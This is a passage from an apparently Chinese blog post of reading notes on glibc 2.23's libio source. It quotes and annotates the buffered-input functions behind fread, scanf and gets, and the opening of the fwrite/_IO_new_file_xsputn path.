class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_file_xsgetn (_IO_FILE *fp, <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br>  _IO_size_t want, have;<br>  _IO_ssize_t count;<br>  <span class="hljs-type">char</span> *s = data;<br><br>  want = n;<br><br><span class="hljs-comment">//步骤一：如果缓冲区为空则分配缓冲区</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Maybe we already have a push back pointer.  */</span><br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_save_base != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-built_in">free</span> (fp-&gt;_IO_save_base);<br>  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;<br>&#125;<br>      _IO_doallocbuf (fp);<br>    &#125;<br><br><span class="hljs-comment">//步骤二：循环读入字节直到满足要求</span><br>  <span class="hljs-keyword">while</span> (want &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;<br><br><span class="hljs-comment">//分支1：已有字节数满足要求则直接读入</span><br>      <span class="hljs-keyword">if</span> (want &lt;= have)<br>&#123;<br>  <span class="hljs-built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);<br>  fp-&gt;_IO_read_ptr += want;<br>  want = <span class="hljs-number">0</span>;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-comment">//分支2-1：读入已有字节，此时缓冲区已清空</span><br>  <span class="hljs-keyword">if</span> (have &gt; <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>      <span class="hljs-built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);<br>      s += have;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      want -= have;<br>      fp-&gt;_IO_read_ptr += have;<br>    &#125;<br><br><span class="hljs-comment">//分支2-2：有backup，查看backup并读入</span><br>  <span class="hljs-comment">/* Check for backup and repeat */</span><br>  <span class="hljs-keyword">if</span> (_IO_in_backup (fp))<br>    &#123;<br>      _IO_switch_to_main_get_area (fp);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br><span class="hljs-comment">//分支2-3：缓冲区的容量大于需求则调用__underflow</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>      &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br><span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>  <span class="hljs-comment">//设置指针</span><br>  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br>  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br><br><span class="hljs-comment">//分支2-4：计算直接从文件中读的字节个数</span><br><span class="hljs-comment">//want剩下的待读入缓冲区后从缓冲区中读</span><br>  <span class="hljs-comment">/* Try to maintain alignment: read a whole number of blocks.  */</span><br>  count = want;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base)<br>    &#123;<br>      _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;<br>      <span class="hljs-keyword">if</span> (block_size &gt;= <span class="hljs-number">128</span>)<br>count -= want % block_size;<br>    &#125;<br><span class="hljs-comment">//调用_IO_SYSREAD直接从文件中读取count字节</span><br><span class="hljs-comment">//_IO_SYSREAD实际上就是跳转表中的_IO_file_read</span><br><span class="hljs-comment">//最终调用的是系统调用read</span><br>  count = _IO_SYSREAD (fp, s, count);<br><span class="hljs-comment">//判断读入是否成功</span><br>  <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>fp-&gt;_flags |= _IO_EOF_SEEN;<br>      <span class="hljs-keyword">else</span><br>fp-&gt;_flags |= _IO_ERR_SEEN;<br><br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>  s += count;<br>  want -= count;<br><span class="hljs-comment">//步骤三：调整文件偏移</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)<br>    _IO_pos_adjust (fp-&gt;_offset, count);<br>&#125;<br>    &#125;<br><br>  <span class="hljs-keyword">return</span> n - want;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="IO-doallocbuf"><a href="#IO-doallocbuf" class="headerlink" title="_IO_doallocbuf"></a>_IO_doallocbuf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_doallocbuf (_IO_FILE *fp)<br>&#123;<br><span class="hljs-comment">//已有缓冲区则直接返回</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base)<br>    <span class="hljs-keyword">return</span>;<br><span class="hljs-comment">//模式或者flag符合要求则调用_IO_DOALLOCATE</span><br><span class="hljs-comment">//_IO_DOALLOCATE实际上就是跳转表中的_IO_file_doallocate</span><br>  <span class="hljs-keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)<br>      <span class="hljs-keyword">return</span>;<br><span class="hljs-comment">//如果缓冲区初始化失败则调用_IO_setb</span><br>  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-file-doallocate"><a href="#IO-file-doallocate" class="headerlink" title="_IO_file_doallocate"></a>_IO_file_doallocate</h3><p>主要过程就是malloc一块缓冲区然后调用_IO_setb设定缓冲区相关指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\filedoalloc.c</span><br><br><span class="hljs-type">int</span><br>_IO_file_doallocate (_IO_FILE *fp)<br>&#123;<br>  _IO_size_t size;<br>  <span class="hljs-type">char</span> *p;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat64</span> <span class="hljs-title">st</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _LIBC</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (_IO_cleanup_registration_needed != <span class="hljs-literal">NULL</span>))<br>    (*_IO_cleanup_registration_needed) ();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  size = _IO_BUFSIZ;<br><span class="hljs-comment">//调用_IO_SYSSTAT（跳转表中的_IO_file_stat）获取FILE信息</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_fileno &gt;= <span class="hljs-number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="hljs-number">0</span>) &gt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (S_ISCHR (st.st_mode))<br>&#123;<br>  <span class="hljs-comment">/* Possibly a tty.  */</span><br>  <span class="hljs-keyword">if</span> (<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DEV_TTY_P</span><br>      DEV_TTY_P (&amp;st) ||<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      local_isatty (fp-&gt;_fileno))<br>    fp-&gt;_flags |= _IO_LINE_BUF;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _IO_HAVE_ST_BLKSIZE</span><br>      <span class="hljs-keyword">if</span> (st.st_blksize &gt; <span class="hljs-number">0</span>)<br>size = st.st_blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>  p = <span class="hljs-built_in">malloc</span> (size);<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (p == <span class="hljs-literal">NULL</span>))<br>    <span class="hljs-keyword">return</span> EOF;<br>  _IO_setb (fp, p, p + size, <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-setb"><a href="#IO-setb" class="headerlink" title="_IO_setb"></a>_IO_setb</h3><p>设置缓冲区指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_setb (_IO_FILE *f, <span class="hljs-type">char</span> *b, <span class="hljs-type">char</span> *eb, <span class="hljs-type">int</span> a)<br>&#123;<br>  <span class="hljs-keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))<br>    <span class="hljs-built_in">free</span> (f-&gt;_IO_buf_base);<br>  f-&gt;_IO_buf_base = b;<br>  f-&gt;_IO_buf_end = eb;<br>  <span class="hljs-keyword">if</span> (a)<br>    f-&gt;_flags &amp;= ~_IO_USER_BUF;<br>  <span class="hljs-keyword">else</span><br>    f-&gt;_flags |= _IO_USER_BUF;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO-switch-to-main-get-area"><a href="#IO-switch-to-main-get-area" class="headerlink" title="_IO_switch_to_main_get_area"></a>_IO_switch_to_main_get_area</h2><p>将缓冲区移至backup</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_switch_to_main_get_area (_IO_FILE *fp)<br>&#123;<br>  <span class="hljs-type">char</span> *tmp;<br>  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;<br>  <span class="hljs-comment">/* Swap _IO_read_end and _IO_save_end. */</span><br>  tmp = fp-&gt;_IO_read_end;<br>  fp-&gt;_IO_read_end = fp-&gt;_IO_save_end;<br>  fp-&gt;_IO_save_end= tmp;<br>  <span class="hljs-comment">/* Swap _IO_read_base and _IO_save_base. */</span><br>  tmp = fp-&gt;_IO_read_base;<br>  fp-&gt;_IO_read_base = fp-&gt;_IO_save_base;<br>  fp-&gt;_IO_save_base = tmp;<br>  <span class="hljs-comment">/* Set _IO_read_ptr. */</span><br>  fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_base;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="underflow"><a href="#underflow" class="headerlink" title="__underflow"></a>__underflow</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">int</span><br>__underflow (_IO_FILE *fp)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-keyword">if</span> (_IO_vtable_offset (fp) == <span class="hljs-number">0</span> &amp;&amp; _IO_fwide (fp, <span class="hljs-number">-1</span>) != <span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">return</span> EOF;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//一些检查</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_mode == <span class="hljs-number">0</span>)<br>    _IO_fwide (fp, <span class="hljs-number">-1</span>);<br>  <span class="hljs-keyword">if</span> (_IO_in_put_mode (fp))<br>    <span class="hljs-keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)<br>      <span class="hljs-keyword">return</span> EOF;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>  <span class="hljs-keyword">if</span> (_IO_in_backup (fp))<br>    &#123;<br>      _IO_switch_to_main_get_area (fp);<br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br><span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (_IO_have_markers (fp))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))<br><span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (_IO_have_backup (fp))<br>    _IO_free_backup_area (fp);<br><span class="hljs-comment">//调用_IO_UNDERFLOW（跳转表中的_IO_new_file_underflow）</span><br><span class="hljs-comment">//JUMP0 (__underflow, fp)</span><br><span class="hljs-comment">//# define _IO_new_file_underflow _IO_file_underflow</span><br>  <span class="hljs-keyword">return</span> _IO_UNDERFLOW (fp);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-new-file-underflow"><a href="#IO-new-file-underflow" class="headerlink" title="_IO_new_file_underflow"></a>_IO_new_file_underflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_new_file_underflow (_IO_FILE *fp)<br>&#123;<br>  _IO_ssize_t count;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)<br>    <span class="hljs-keyword">return</span> (EOF);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br><span class="hljs-comment">//缓冲区未清空则直接返回</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br><br><span class="hljs-comment">//没有缓冲区则调用_IO_doallocbuf分配缓冲区</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Maybe we already have a push back pointer.  */</span><br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_save_base != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-built_in">free</span> (fp-&gt;_IO_save_base);<br>  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;<br>&#125;<br>      _IO_doallocbuf (fp);<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>      _IO_flush_all_linebuffered ();<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>      _IO_acquire_lock (_IO_stdout);<br><br>      <span class="hljs-keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))<br>  == (_IO_LINKED | _IO_LINE_BUF))<br>_IO_OVERFLOW (_IO_stdout, EOF);<br><br>      _IO_release_lock (_IO_stdout);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br><br>  _IO_switch_to_get_mode (fp);<br><br><span class="hljs-comment">//设置结构体指针</span><br>  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;<br>  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;<br>  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end<br>    = fp-&gt;_IO_buf_base;<br><br><span class="hljs-comment">//调用_IO_SYSREAD函数读入数据</span><br>  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,<br>       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<br>  <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>fp-&gt;_flags |= _IO_EOF_SEEN;<br>      <span class="hljs-keyword">else</span><br>fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="hljs-number">0</span>;<br>  &#125;<br>  fp-&gt;_IO_read_end += count;<br>  <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>    &#123;<br>      fp-&gt;_offset = _IO_pos_BAD;<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)<br>    _IO_pos_adjust (fp-&gt;_offset, count);<br>  <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="其他输入函数"><a href="#其他输入函数" class="headerlink" title="其他输入函数"></a>其他输入函数</h2><h3 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h3><p>scanf的函数调用栈如下，最终是使用跳转表中的_IO_new_file_underflow实现输入的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">read<br>_IO_new_file_underflow-&gt;_IO_doallocbuf-&gt;_IO_file_doallocate<br>__IO_default_uflow<br>__uflow<br>__vfscanf_internal<br>__isoc99_scanf<br></code></pre></td></tr></table></figure><h3 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h3><p>和scanf差不多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">read<br>_IO_new_file_underflow-&gt;_IO_doallocbuf-&gt;_IO_file_doallocate<br>__IO_default_uflow<br>__uflow<br>gets<br></code></pre></td></tr></table></figure><h1 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h1><p>函数调用流程：</p><img src="/2023/02/10/IO%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/fwrite.jpg" class title="fwrite"><p>执行fwrite函数实际上执行的是_IO_write函数，_IO_write又调用了_IO_sputn</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\iofwrite.c</span><br><br>_IO_size_t<br>_IO_fwrite (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)<br>&#123;<br>  _IO_size_t request = size * count;<br>  _IO_size_t written = <span class="hljs-number">0</span>;<br>  CHECK_FILE (fp, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (request == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  _IO_acquire_lock (fp);<br>  <span class="hljs-keyword">if</span> (_IO_vtable_offset (fp) != <span class="hljs-number">0</span> || _IO_fwide (fp, <span class="hljs-number">-1</span>) == <span class="hljs-number">-1</span>)<br>    written = _IO_sputn (fp, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) buf, request);<br>  _IO_release_lock (fp);<br>  <span class="hljs-keyword">if</span> (written == request || written == EOF)<br>    <span class="hljs-keyword">return</span> count;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> written / size;<br>&#125;<br></code></pre></td></tr></table></figure><p>_IO_sputn其实是调用跳转表中的_IO_file_xsputn（实际上是_IO_new_file_xsputn），步骤如下：</p><ul><li>将目标数据拷贝至输出缓冲区</li><li>如果缓冲区还有空间则先吧数据拷贝进输出缓冲区</li><li>如果还有数据剩余则说明缓冲区未建立或者缓冲区已满，调用_IO_OVERFLOW建立或清空缓冲区</li><li>判断数据是否大块，是则先调用new_do_write输出小块数据，然后调用_IO_default_xsputn将剩余数据拷贝进缓冲区<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br>_IO_size_t<br>_IO_new_file_xsputn (_IO_FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) data;<br>  _IO_size_t to_do = n;<br>  <span class="hljs-type">int</span> must_flush = <span class="hljs-number">0</span>;<br>  _IO_size_t count = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//计算缓冲区空间count</span><br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;<br>      <span class="hljs-keyword">if</span> (count &gt;= n)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *p;<br>  <span class="hljs-keyword">for</span> (p = s + n; p &gt; s; )<br>    &#123;<br>      <span class="hljs-keyword">if</span> (*--p == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>&#123;<br>  count = p - s + <span class="hljs-number">1</span>;<br>  must_flush = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">break</span>;<br>&#125;<br>    &#125;<br>&#125;<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> 